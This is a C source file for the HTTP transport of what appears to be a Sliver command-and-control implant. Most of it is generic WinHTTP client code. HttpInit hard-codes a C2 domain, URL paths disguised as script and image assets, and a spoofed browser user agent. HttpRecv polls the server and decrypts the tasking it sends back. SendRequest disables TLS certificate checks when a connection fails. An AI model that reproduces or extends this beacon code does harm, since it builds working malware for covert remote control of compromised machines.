#include "pch.h"

LPSTR GetContentTypeString
(
	_In_ ContentTy ContentTypeEnum
)
{
	if (ContentTypeEnum == ApplicationAtomXml) {
		return DuplicateStrA("application/atom+xml", 0);
	}
	else if (ContentTypeEnum == ApplicationHttp) {
		return DuplicateStrA("application/http", 0);
	}
	else if (ContentTypeEnum == ApplicationJavascript) {
		return DuplicateStrA("application/javascript", 0);
	}
	else if (ContentTypeEnum == ApplicationJson) {
		return DuplicateStrA("application/json", 0);
	}
	else if (ContentTypeEnum == ApplicationXjson) {
		return DuplicateStrA("application/x-json", 0);
	}
	else if (ContentTypeEnum == ApplicationOctetstream) {
		return DuplicateStrA("application/octet-stream", 0);
	}
	else if (ContentTypeEnum == ApplicationXWwwFormUrlencoded) {
		return DuplicateStrA("application/x-www-form-urlencoded", 0);
	}
	else if (ContentTypeEnum == MultipartFormData) {
		return DuplicateStrA("multipart/form-data", 0);
	}
	else if (ContentTypeEnum == Boundary) {
		return DuplicateStrA("boundary", 0);
	}
	else if (ContentTypeEnum == FormData) {
		return DuplicateStrA("form-data", 0);
	}
	else if (ContentTypeEnum == ApplicationXjavascript) {
		return DuplicateStrA("application/x-javascript", 0);
	}
	else if (ContentTypeEnum == ApplicationXml) {
		return DuplicateStrA("application/xml", 0);
	}
	else if (ContentTypeEnum == MessageHttp) {
		return DuplicateStrA("message/http", 0);
	}
	else if (ContentTypeEnum == Text) {
		return DuplicateStrA("text", 0);
	}
	else if (ContentTypeEnum == TextJavascript) {
		return DuplicateStrA("text/javascript", 0);
	}
	else if (ContentTypeEnum == TextJson) {
		return DuplicateStrA("text/json", 0);
	}
	else if (ContentTypeEnum == TextPlain) {
		return DuplicateStrA("text/plain", 0);
	}
	else if (ContentTypeEnum == TextPlainUtf16) {
		return DuplicateStrA("text/plain; charset=utf-16", 0);
	}
	else if (ContentTypeEnum == TextPlainUtf16le) {
		return DuplicateStrA("text/plain; charset=utf-16le", 0);
	}
	else if (ContentTypeEnum == TextPlainUtf8) {
		return DuplicateStrA("text/plain; charset=utf-8", 0);
	}
	else if (ContentTypeEnum == TextXjavascript) {
		return DuplicateStrA("text/x-javascript", 0);
	}
	else if (ContentTypeEnum == TextXjson) {
		return DuplicateStrA("text/x-json", 0);
	}
}

LPSTR GetHeaderString
(
	_In_ HttpHeader HeaderTy
)
{
	if (HeaderTy == Accept) {
		return DuplicateStrA("Accept", 0);
	}
	else if (HeaderTy == AcceptCharset) {
		return DuplicateStrA("Accept-Charset", 0);
	}
	else if (HeaderTy == AcceptEncoding) {
		return DuplicateStrA("Accept-Encoding", 0);
	}
	else if (HeaderTy == AcceptLanguage) {
		return DuplicateStrA("Accept-Language", 0);
	}
	else if (HeaderTy == AcceptRanges) {
		return DuplicateStrA("Accept-Ranges", 0);
	}
	else if (HeaderTy == AccessControlAllowOrigin) {
		return DuplicateStrA("Access-Control-Allow-Origin", 0);
	}
	else if (HeaderTy == Age) {
		return DuplicateStrA("Age", 0);
	}
	else if (HeaderTy == Allow) {
		return DuplicateStrA("Allow", 0);
	}
	else if (HeaderTy == Authorization) {
		return DuplicateStrA("Authorization", 0);
	}
	else if (HeaderTy == CacheControl) {
		return DuplicateStrA("Cache-Control", 0);
	}
	else if (HeaderTy == Cookie) {
		return DuplicateStrA("Cookie", 0);
	}
	else if (HeaderTy == Connection) {
		return DuplicateStrA("Connection", 0);
	}
	else if (HeaderTy == ContentEncoding) {
		return DuplicateStrA("Content-Encoding", 0);
	}
	else if (HeaderTy == ContentLanguage) {
		return DuplicateStrA("Content-Language", 0);
	}
	else if (HeaderTy == ContentLength) {
		return DuplicateStrA("Content-Length", 0);
	}
	else if (HeaderTy == ContentLocation) {
		return DuplicateStrA("Content-Location", 0);
	}
	else if (HeaderTy == ContentMd5) {
		return DuplicateStrA("Content-MD5", 0);
	}
	else if (HeaderTy == ContentRange) {
		return DuplicateStrA("Content-Range", 0);
	}
	else if (HeaderTy == ContentType) {
		return DuplicateStrA("Content-Type", 0);
	}
	else if (HeaderTy == ContentDisposition) {
		return DuplicateStrA("Content-Disposition", 0);
	}
	else if (HeaderTy == Date) {
		return DuplicateStrA("Date", 0);
	}
	else if (HeaderTy == Etag) {
		return DuplicateStrA("ETag", 0);
	}
	else if (HeaderTy == Expect) {
		return DuplicateStrA("Expect", 0);
	}
	else if (HeaderTy == Expires) {
		return DuplicateStrA("Expires", 0);
	}
	else if (HeaderTy == From) {
		return DuplicateStrA("From", 0);
	}
	else if (HeaderTy == Host) {
		return DuplicateStrA("Host", 0);
	}
	else if (HeaderTy == IfMatch) {
		return DuplicateStrA("If-Match", 0);
	}
	else if (HeaderTy == IfModifiedSince) {
		return DuplicateStrA("If-Modified-Since", 0);
	}
	else if (HeaderTy == IfNoneMatch) {
		return DuplicateStrA("If-None-Match", 0);
	}
	else if (HeaderTy == IfRange) {
		return DuplicateStrA("If-Range", 0);
	}
	else if (HeaderTy == IfUnmodifiedSince) {
		return DuplicateStrA("If-Unmodified-Since", 0);
	}
	else if (HeaderTy == LastModified) {
		return DuplicateStrA("Last-Modified", 0);
	}
	else if (HeaderTy == Location) {
		return DuplicateStrA("Location", 0);
	}
	else if (HeaderTy == MaxForwards) {
		return DuplicateStrA("Max-Forwards", 0);
	}
	else if (HeaderTy == Pragma) {
		return DuplicateStrA("Pragma", 0);
	}
	else if (HeaderTy == ProxyAuthenticate) {
		return DuplicateStrA("Proxy-Authenticate", 0);
	}
	else if (HeaderTy == ProxyAuthorization) {
		return DuplicateStrA("Proxy-Authorization", 0);
	}
	else if (HeaderTy == Range) {
		return DuplicateStrA("Range", 0);
	}
	else if (HeaderTy == Referer) {
		return DuplicateStrA("Referer", 0);
	}
	else if (HeaderTy == RetryAfter) {
		return DuplicateStrA("Retry-After", 0);
	}
	else if (HeaderTy == Server) {
		return DuplicateStrA("Server", 0);
	}
	else if (HeaderTy == SetCookie) {
		return DuplicateStrA("Set-Cookie", 0);
	}
	else if (HeaderTy == Te) {
		return DuplicateStrA("TE", 0);
	}
	else if (HeaderTy == Trailer) {
		return DuplicateStrA("Trailer", 0);
	}
	else if (HeaderTy == TransferEncoding) {
		return DuplicateStrA("Transfer-Encoding", 0);
	}
	else if (HeaderTy == Upgrade) {
		return DuplicateStrA("Upgrade", 0);
	}
	else if (HeaderTy == UserAgent) {
		return DuplicateStrA("User-Agent", 0);
	}
	else if (HeaderTy == Vary) {
		return DuplicateStrA("Vary", 0);
	}
	else if (HeaderTy == Via) {
		return DuplicateStrA("Via", 0);
	}
	else if (HeaderTy == Warning) {
		return DuplicateStrA("Warning", 0);
	}
	else if (HeaderTy == WwwAuthenticate) {
		return DuplicateStrA("WWW-Authenticate", 0);
	}
	else if (HeaderTy == UpgradeInsecureRequests) {
		return DuplicateStrA("Upgrade-Insecure-Requests", 0);
	}
	// UpgradeInsecureRequests
}

static DWORD WinHttpDefaultProxyConstant(VOID)
{
#if _WIN32_WINNT >= _WIN32_WINNT_VISTA
#if _WIN32_WINNT < _WIN32_WINNT_WINBLUE
	if (!FSecure::IsWindows8Point1OrGreater())
	{
		// Not Windows 8.1 or later, use the default proxy setting
		return WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
	}
#endif // _WIN32_WINNT < _WIN32_WINNT_WINBLUE

	// Windows 8.1 or later, use the automatic proxy setting
	return WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY;
#else  // ^^^ _WIN32_WINNT >= _WIN32_WINNT_VISTA ^^^ // vvv _WIN32_WINNT < _WIN32_WINNT_VISTA vvv
	return WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
#endif // _WIN32_WINNT >= _WIN32_WINNT_VISTA
}

PHTTP_SESSION HttpSessionInit
(
	_In_opt_ PWEB_PROXY pProxyInfo
)
{
	DWORD dwAccessType = 0;
	WINHTTP_PROXY_INFO ProxyDefault;
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyIE;
	LPWSTR lpProxyName = NULL;
	LPWSTR lpProxyBypass = NULL;
	PHTTP_SESSION Result;
	LPWSTR lpHostName = NULL;

	Result = ALLOC(sizeof(HTTP_SESSION));
	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
	SecureZeroMemory(&ProxyIE, sizeof(ProxyIE));
	if (pProxyInfo == NULL) {
		dwAccessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
		lpProxyName = WINHTTP_NO_PROXY_NAME;
		lpProxyBypass = WINHTTP_NO_PROXY_BYPASS;
	}
	else if (pProxyInfo->Mode == UseDefault) {
		dwAccessType = WinHttpDefaultProxyConstant();
	}
	else if (pProxyInfo->Mode == ProxyDisabled) {
		dwAccessType = WINHTTP_ACCESS_TYPE_NO_PROXY;
	}
	else if (pProxyInfo->Mode == UseAutoDiscovery) {
		dwAccessType = WinHttpDefaultProxyConstant();
		if (dwAccessType != WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY) {
			SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
			if (!WinHttpGetDefaultProxyConfiguration(&ProxyDefault) || ProxyDefault.dwAccessType == WINHTTP_ACCESS_TYPE_NO_PROXY) {
				if (WinHttpGetIEProxyConfigForCurrentUser(&ProxyIE)) {
					if (ProxyIE.fAutoDetect) {
						Result->ProxyAutoConfig = TRUE;
					}
					else if (ProxyIE.lpszAutoConfigUrl) {
						Result->ProxyAutoConfig = TRUE;
						Result->lpProxyAutoConfigUrl = ConvertWcharToChar(ProxyIE.lpszAutoConfigUrl);
					}
					else if (ProxyIE.lpszProxy)
					{
						dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
						lpProxyName = ProxyIE.lpszProxy;
						if (ProxyIE.lpszProxyBypass)
						{
							lpProxyBypass = DuplicateStrW(ProxyIE.lpszProxyBypass, 0);
						}
					}
				}
			}
		}
	}
	else {
		dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
		if ((pProxyInfo->pUri->bUseHttps && pProxyInfo->pUri->wPort == INTERNET_DEFAULT_HTTPS_PORT) || (!pProxyInfo->pUri->bUseHttps && pProxyInfo->pUri->wPort == INTERNET_DEFAULT_HTTP_PORT)) {
			lpProxyName = ConvertCharToWchar(pProxyInfo->pUri->lpHostName);
		}
		else {
			lpHostName = ConvertCharToWchar(pProxyInfo->pUri->lpHostName);
			lpProxyName = ALLOC((lstrlenW(lpHostName) + 10) * sizeof(WCHAR));
			wsprintfW(lpProxyName, L"%s:%d", lpHostName, pProxyInfo->pUri->wPort);
		}
	}

	Result->hSession = WinHttpOpen(NULL, dwAccessType, lpProxyName, lpProxyBypass, 0);
	//Result->hSession = WinHttpOpen(NULL, dwAccessType, L"http://127.0.0.1:8888", L"<local>", 0);
	if (!Result->hSession) {
		LOG_ERROR("WinHttpOpen", GetLastError());
		FreeHttpSession(Result);
		Result = NULL;
		goto CLEANUP;
	}

CLEANUP:
	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpProxyName != NULL) {
		FREE(lpProxyName);
	}

	if (lpProxyBypass != NULL) {
		FREE(lpProxyBypass);
	}

	return Result;
}

PHTTP_CLIENT HttpClientInit
(
	_In_ PURI pUri,
	_In_ PWEB_PROXY pProxyConfig
)
{
	PHTTP_CLIENT Result = NULL;
	LPWSTR lpHostName = NULL;

	lpHostName = ConvertCharToWchar(pUri->lpHostName);
	Result = ALLOC(sizeof(HTTP_CLIENT));
	Result->pUri = pUri;
	Result->pHttpSession = HttpSessionInit(pProxyConfig);
	Result->hConnection = WinHttpConnect(Result->pHttpSession->hSession, lpHostName, pUri->wPort, 0);
	if (Result->hConnection == NULL) {
		LOG_ERROR("WinHttpConnect", GetLastError());
		FreeHttpClient(Result);
		Result = NULL;
	}

	FREE(lpHostName);
	return Result;
}

BOOL SetHeader
(
	_In_ HINTERNET hRequest,
	_In_ LPSTR lpHeaderName,
	_In_ LPSTR lpHeaderData
)
{
	LPWSTR lpHeaderNameW = ConvertCharToWchar(lpHeaderName);
	LPWSTR lpHeaderDataW = ConvertCharToWchar(lpHeaderData);
	DWORD dwBufferLength = lstrlenW(lpHeaderNameW) + lstrlenW(lpHeaderDataW) + 10;
	LPWSTR lpFullHeader = ALLOC(dwBufferLength * sizeof(WCHAR));
	BOOL Result = FALSE;

	wsprintfW(lpFullHeader, L"%s: %s", lpHeaderNameW, lpHeaderDataW);
	if (StrCmpW(&lpFullHeader[lstrlenW(lpFullHeader) - 2], L"\r\n")) {
		StrCatW(lpFullHeader, L"\r\n");
	}

	Result = WinHttpAddRequestHeaders(hRequest, lpFullHeader, -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
	if (!Result) {
		LOG_ERROR("WinHttpAddRequestHeaders", GetLastError());
	}

	FREE(lpFullHeader);
	FREE(lpHeaderNameW);
	FREE(lpHeaderDataW);
	return Result;
}

HINTERNET SendRequest
(
	_In_ PHTTP_CLIENT This,
	_In_ PHTTP_REQUEST pRequest,
	_In_ LPSTR lpPath,
	_In_ DWORD dwNumberOfAttemps
)
{
	LPWSTR lpMethod = NULL;
	PURI pUri = This->pUri;
	LPWSTR pPath = NULL;
	HINTERNET hRequest = NULL;
	DWORD i = 0;
	PWINHTTP_PROXY_INFO pProxyInfo = NULL;
	DWORD dwLastError = 0;
	DWORD dwFlag = WINHTTP_FLAG_REFRESH;
	LPSTR lpHeaderStr = NULL;

	if (lpPath != NULL) {
		pPath = ConvertCharToWchar(lpPath);
	}
	else if (lstrlenA(pUri->lpPathWithQuery) > 0) {
		pPath = ConvertCharToWchar(pUri->lpPathWithQuery);
	}

	lpMethod = ConvertCharToWchar(pRequest->Method);
	if (pUri->bUseHttps) {
		dwFlag |= WINHTTP_FLAG_SECURE;
	}

	hRequest = WinHttpOpenRequest(This->hConnection, lpMethod, pPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlag);
	if (hRequest == NULL) {
		LOG_ERROR("WinHttpOpenRequest", GetLastError());
		goto CLEANUP;
	}

	if (!WinHttpSetTimeouts(hRequest, pRequest->dwResolveTimeout, pRequest->dwConnectTimeout, pRequest->dwSendTimeout, pRequest->dwReceiveTimeout)) {
		LOG_ERROR("WinHttpSetTimeouts", GetLastError());
		goto CLEANUP;
	}

	for (i = 0; i < _countof(pRequest->Headers); i++) {
		if (pRequest->Headers[i]) {
			lpHeaderStr = GetHeaderString(i);
			SetHeader(hRequest, lpHeaderStr, pRequest->Headers[i]);
			FREE(lpHeaderStr);
		}
	}

	pProxyInfo = GetProxyForUrl(This->pHttpSession, This->pUri);
	if (pProxyInfo != NULL) {
		/*pProxyInfo = ALLOC(sizeof(WINHTTP_PROXY_INFO));
		pProxyInfo->dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
		pProxyInfo->lpszProxy = L"http://127.0.0.1:8888";
		pProxyInfo->lpszProxyBypass = L"<local>";*/
		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, pProxyInfo, sizeof(WINHTTP_PROXY_INFO));
	}

	i = 0;
	while (!WinHttpSendRequest(hRequest, NULL, 0, pRequest->lpData, pRequest->cbData, pRequest->cbData, 0)) {
		dwLastError = GetLastError();
		if (dwLastError == ERROR_WINHTTP_RESEND_REQUEST) {
			continue;
		}

		if (dwLastError == ERROR_WINHTTP_TIMEOUT) {
			hRequest = NULL;
			goto CLEANUP;
		}

		LOG_ERROR("WinHttpSendRequest", dwLastError);
		if (dwLastError == ERROR_WINHTTP_SECURE_FAILURE) {
			dwFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
			if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlag, sizeof(dwFlag))) {
				LOG_ERROR("WinHttpSetOption", GetLastError());
				hRequest = NULL;
				goto CLEANUP;
			}
		}

		i++;
		if (i > dwNumberOfAttemps) {
			hRequest = NULL;
			goto CLEANUP;
		}
	}

	if (!WinHttpReceiveResponse(hRequest, NULL)) {
		dwLastError = GetLastError();
		if (dwLastError == ERROR_WINHTTP_TIMEOUT) {
			WinHttpCloseHandle(hRequest);
			hRequest = NULL;
			goto CLEANUP;
		}

		LOG_ERROR("WinHttpReceiveResponse", dwLastError);
		WinHttpCloseHandle(hRequest);
		hRequest = NULL;
		goto CLEANUP;
	}
CLEANUP:
	if (lpMethod != NULL) {
		FREE(lpMethod);
	}

	if (pPath != NULL) {
		FREE(pPath);
	}

	if (pProxyInfo != NULL) {
		FREE(pProxyInfo);
	}

	return hRequest;
}

PWINHTTP_PROXY_INFO GetProxyForUrl
(
	_In_ PHTTP_SESSION pHttpSession,
	_In_ PURI pUri
)
{
	WINHTTP_AUTOPROXY_OPTIONS AutoProxyOpt;
	PWINHTTP_PROXY_INFO Result = NULL;
	LPWSTR lpFullUri = NULL;

	if (!pHttpSession->ProxyAutoConfig) {
		return NULL;
	}

	SecureZeroMemory(&AutoProxyOpt, sizeof(AutoProxyOpt));
	if (!pHttpSession->lpProxyAutoConfigUrl) {
		//if (FALSE) {
		AutoProxyOpt.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
		AutoProxyOpt.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
	}
	else {
		AutoProxyOpt.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
		//AutoProxyOpt.lpszAutoConfigUrl = ConvertCharToWchar("http://127.0.0.1:8888/script");
		AutoProxyOpt.lpszAutoConfigUrl = ConvertCharToWchar(pHttpSession->lpProxyAutoConfigUrl);
	}

	AutoProxyOpt.fAutoLogonIfChallenged = TRUE;
	Result = ALLOC(sizeof(WINHTTP_PROXY_INFO));
	lpFullUri = ConvertCharToWchar(pUri->lpFullUri);
	if (!WinHttpGetProxyForUrl(pHttpSession->hSession, lpFullUri, &AutoProxyOpt, Result)) {
		LOG_ERROR("WinHttpGetProxyForUrl", GetLastError());
		FREE(Result);
		Result = NULL;
		goto CLEANUP;
	}

CLEANUP:
	if (AutoProxyOpt.lpszAutoConfigUrl != NULL) {
		FREE(AutoProxyOpt.lpszAutoConfigUrl);
	}

	if (lpFullUri != NULL) {
		FREE(lpFullUri);
	}

	return Result;
}

DWORD ReadStatusCode
(
	_In_ HINTERNET hRequest
)
{
	DWORD dwResult = 0;
	DWORD dwSize = sizeof(dwResult);

	if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwResult, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
		LOG_ERROR("WinHttpQueryHeaders", GetLastError());
		return 0;
	}

	return dwResult;
}

BOOL ReceiveData
(
	_In_ HINTERNET hRequest,
	_Out_ PBYTE* pData,
	_Out_ PDWORD pdwDataSize
)
{
	DWORD dwNumberOfBytesAvailable = 0;
	BOOL bResult = FALSE;
	PBYTE Buffer = NULL;
	DWORD dwNumberOfBytesRead = 0;
	DWORD dwTotalSize = 0;

	do {
		dwNumberOfBytesAvailable = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable)) {
			LOG_ERROR("WinHttpQueryDataAvailable", GetLastError());
			goto END;
		}

		if (dwNumberOfBytesAvailable == 0) {
			break;
		}

		if (Buffer == NULL) {
			Buffer = ALLOC(dwNumberOfBytesAvailable);
		}
		else {
			Buffer = REALLOC(Buffer, dwTotalSize + dwNumberOfBytesAvailable);
		}

		dwNumberOfBytesRead = 0;
		if (!WinHttpReadData(hRequest, &Buffer[dwTotalSize], dwNumberOfBytesAvailable, &dwNumberOfBytesRead)) {
			LOG_ERROR("WinHttpReadData", GetLastError());
			goto END;
		}

		if (dwNumberOfBytesRead == 0) {
			break;
		}

		dwTotalSize += dwNumberOfBytesRead;
	} while (dwNumberOfBytesAvailable > 0);

	bResult = TRUE;
	Buffer = REALLOC(Buffer, dwTotalSize + 1);
	*pData = Buffer;
	*pdwDataSize = dwTotalSize;
END:
	return bResult;
}

VOID FreeHttpSession
(
	_In_ PHTTP_SESSION pHttpSession
)
{
	if (pHttpSession != NULL) {
		if (pHttpSession->lpProxyAutoConfigUrl != NULL) {
			FREE(pHttpSession->lpProxyAutoConfigUrl);
		}

		if (pHttpSession->hSession != NULL) {
			WinHttpCloseHandle(pHttpSession->hSession);
		}

		FREE(pHttpSession);
	}
}

VOID FreeHttpClient
(
	_In_ PHTTP_CLIENT pHttpClient
)
{
	if (pHttpClient != NULL) {
		FreeUri(pHttpClient->pUri);
		FreeHttpSession(pHttpClient->pHttpSession);
		if (pHttpClient->hConnection != NULL) {
			WinHttpCloseHandle(pHttpClient->hConnection);
		}

		FREE(pHttpClient);
	}
}

VOID FreeHttpRequest
(
	_In_ PHTTP_REQUEST pHttpReq
)
{
	DWORD i = 0;

	if (pHttpReq != NULL) {
		for (i = 0; i < _countof(pHttpReq->Headers); i++) {
			if (pHttpReq->Headers[i] != NULL) {
				FREE(pHttpReq->Headers[i]);
			}
		}

		if (pHttpReq->Method != NULL) {
			FREE(pHttpReq->Method);
		}

		FREE(pHttpReq);
	}
}

PHTTP_REQUEST CreateHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ LPSTR lpMethod,
	_In_ LPSTR lpData,
	_In_ DWORD cbData
)
{
	PHTTP_REQUEST Result = NULL;

	Result = ALLOC(sizeof(HTTP_REQUEST));
	Result->dwConnectTimeout = pHttpConfig->dwConnectTimeout;
	Result->dwResolveTimeout = pHttpConfig->dwResolveTimeout;
	Result->dwSendTimeout = pHttpConfig->dwSendTimeout;
	Result->dwReceiveTimeout = pHttpConfig->dwReceiveTimeout;
	if (lpData != NULL && cbData > 0) {
		Result->lpData = lpData;
		Result->cbData = cbData;
	}

	Result->Method = DuplicateStrA(lpMethod, 0);
	return Result;
}

VOID FreeHttpResp
(
	_In_ PHTTP_RESP pResp
)
{
	if (pResp != NULL) {
		if (pResp->hRequest != NULL) {
			WinHttpCloseHandle(pResp->hRequest);
		}

		if (pResp->pRespData != NULL) {
			FREE(pResp->pRespData);
		}

		FREE(pResp);
	}
}

PHTTP_RESP SendHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ PHTTP_CLIENT pHttpClient,
	_In_ LPWSTR lpPath,
	_In_ LPSTR lpMethod,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader,
	_In_ BOOL GetRespData
)
{
	PHTTP_REQUEST pHttpRequest = NULL;
	HINTERNET hRequest = NULL;
	DWORD dwStatusCode = 0;
	DWORD i = 0;
	DWORD cbResp = 0;
	PHTTP_RESP pResult = NULL;
	LPSTR lpAuthorizationHeader = NULL;

	pHttpRequest = CreateHttpRequest(pHttpConfig, lpMethod, lpData, cbData);
	for (i = 0; i < HeaderEnumEnd; i++) {
		if (pHttpConfig->AdditionalHeaders[i] != NULL) {
			pHttpRequest->Headers[i] = DuplicateStrA(pHttpConfig->AdditionalHeaders[i], 0);
		}
	}

	if (lpContentType != NULL) {
		if (pHttpRequest->Headers[ContentType] != NULL) {
			FREE(pHttpRequest->Headers[ContentType]);
		}

		pHttpRequest->Headers[ContentType] = DuplicateStrA(lpContentType, 0);
	}

	if (pHttpRequest->Headers[CacheControl] != NULL) {
		FREE(pHttpRequest->Headers[CacheControl]);
	}

	pHttpRequest->Headers[CacheControl] = DuplicateStrA("no-cache", 0);
	if (pHttpRequest->Headers[UserAgent] != NULL) {
		FREE(pHttpRequest->Headers[UserAgent]);
	}

	pHttpRequest->Headers[UserAgent] = DuplicateStrA(pHttpConfig->lpUserAgent, 0);
	if (SetAuthorizationHeader) {
		lpAuthorizationHeader = ALLOC(lstrlenA("Bearer ") + lstrlenA(pHttpConfig->lpAccessToken) + 1);
		StrCpyA(lpAuthorizationHeader, "Bearer ");
		StrCatA(lpAuthorizationHeader, pHttpConfig->lpAccessToken);
		if (pHttpRequest->Headers[Authorization] != NULL) {
			FREE(pHttpRequest->Headers[Authorization]);
		}

		pHttpRequest->Headers[Authorization] = lpAuthorizationHeader;
	}

	if (!pHttpClient->pUri->bUseHttps && !pHttpConfig->DisableUpgradeHeader) {
		if (pHttpRequest->Headers[UpgradeInsecureRequests] != NULL) {
			FREE(pHttpRequest->Headers[UpgradeInsecureRequests]);
		}

		pHttpRequest->Headers[UpgradeInsecureRequests] = DuplicateStrA("1", 0);
	}

	hRequest = SendRequest(pHttpClient, pHttpRequest, lpPath, pHttpConfig->dwNumberOfAttemps);
	if (hRequest == NULL) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(HTTP_RESP));
	dwStatusCode = ReadStatusCode(hRequest);
	if ((dwStatusCode == HTTP_STATUS_OK || dwStatusCode == HTTP_STATUS_ACCEPTED) && GetRespData) {
		if (!ReceiveData(hRequest, &pResult->pRespData, &cbResp)) {
			if (pResult->pRespData != NULL) {
				FREE(pResult->pRespData);
				pResult->pRespData = NULL;
			}

			cbResp = 0;
		}
	}

	pResult->hRequest = hRequest;
	pResult->cbResp = cbResp;
	pResult->dwStatusCode = dwStatusCode;
CLEANUP:
	FreeHttpRequest(pHttpRequest);

	return pResult;
};

PSLIVER_HTTP_CLIENT HttpInit()
{
	LPSTR lpProxy = NULL;
	PSLIVER_HTTP_CLIENT pResult = NULL;
	BOOL IsOk = FALSE;
	LPSTR lpEncodedSessionKey = NULL;

	// Tu dinh config --------------------------------------------------------------------
	CHAR szUri[] = "https://ubuntu-icefrog2000.com";
	LPSTR PollPaths[] = { "bundles", "bundle", "scripts" };
	LPSTR PollFiles[] = { "backbone", "app", "app.min", "array", "script"};
	LPSTR SessionPaths[] = { "upload", "actions" };
	LPSTR SessionFiles[] = { "samples", "rpc", "index" };
	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
	LPSTR CloseFiles[] = { "example", "favicon" };
	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";

	DWORD i = 0;

	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
	pResult->pHttpConfig = ALLOC(sizeof(HTTP_CONFIG));
	pResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
	lpProxy = GetProxyConfig();
	if (lpProxy != NULL) {
		if (!lstrcmpA(lpProxy, "auto")) {
			pResult->pHttpConfig->pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
		}
		else {
			pResult->pHttpConfig->pProxyConfig = ProxyInit(UserProvided, lpProxy);
		}
	}

	pResult->pHttpConfig->dwNumberOfAttemps = 10;
	pResult->cPollPaths = _countof(PollPaths);
	for (i = 0; i < _countof(PollPaths); i++) {
		pResult->PollPaths[i] = DuplicateStrA(PollPaths[i], 0);
	}

	pResult->cPollFiles = _countof(PollFiles);
	for (i = 0; i < _countof(PollFiles); i++) {
		pResult->PollFiles[i] = DuplicateStrA(PollFiles[i], 0);
	}

	pResult->cSessionFiles = _countof(SessionFiles);
	for (i = 0; i < _countof(SessionFiles); i++) {
		pResult->SessionFiles[i] = DuplicateStrA(SessionFiles[i], 0);
	}

	pResult->cSessionPaths = _countof(SessionPaths);
	for (i = 0; i < _countof(SessionPaths); i++) {
		pResult->SessionPaths[i] = DuplicateStrA(SessionPaths[i], 0);
	}

	pResult->cCloseFiles = _countof(CloseFiles);
	for (i = 0; i < _countof(CloseFiles); i++) {
		pResult->CloseFiles[i] = DuplicateStrA(CloseFiles[i], 0);
	}

	pResult->cClosePaths = _countof(ClosePaths);
	for (i = 0; i < _countof(ClosePaths); i++) {
		pResult->ClosePaths[i] = DuplicateStrA(ClosePaths[i], 0);
	}

	pResult->dwMinNumOfSegments = 2;
	pResult->dwMaxNumOfSegments = 4;
	pResult->dwPollInterval = 3;
	pResult->UseStandardPort = TRUE;
	pResult->lpHostName = DuplicateStrA(szUri, 0);
	IsOk = TRUE;
CLEANUP:
	if (lpProxy != NULL) {
		FREE(lpProxy);
	}

	if (lpEncodedSessionKey != NULL) {
		FREE(lpEncodedSessionKey);
	}

	if (!IsOk && pResult != NULL) {
		FreeHttpClient(pResult);
	}

	return pResult;
}

PENVELOPE HttpRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
)
{
	LPSTR lpUri = NULL;
	PHTTP_RESP pResp = NULL;
	PURI pUri = NULL;
	PENVELOPE pResult = NULL;
	PBUFFER pDecodedData = NULL;
	DWORD cbDecodedData = 0;
	PBUFFER pPlainText = NULL;

	lpUri = CreatePollURL(pHttpClient);
	if (lpUri == NULL) {
		goto CLEANUP;
	}

	pUri = UriInit(lpUri);
	pResp = SendHttpRequest(&pHttpClient->pHttpConfig, pHttpClient->pHttpClient, pUri->lpPathWithQuery, "GET", NULL, NULL, 0, FALSE, TRUE);
	if (pResp == NULL) {
		goto CLEANUP;
	}

	if (pResp->dwStatusCode == HTTP_STATUS_NO_CONTENT) {
		goto CLEANUP;
	}

	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
		goto CLEANUP;
	}

	pDecodedData = SliverBase64Decode(pResp->pRespData);
	pPlainText = SliverDecrypt(pConfig, pDecodedData);
	pResult = UnmarshalEnvelope(pPlainText);
CLEANUP:
	if (lpUri != NULL) {
		FREE(lpUri);
	}

	FreeBuffer(pPlainText);
	FreeBuffer(pDecodedData);
	FreeUri(pUri);
	FreeHttpResp(pResp);
	return pResult;
}

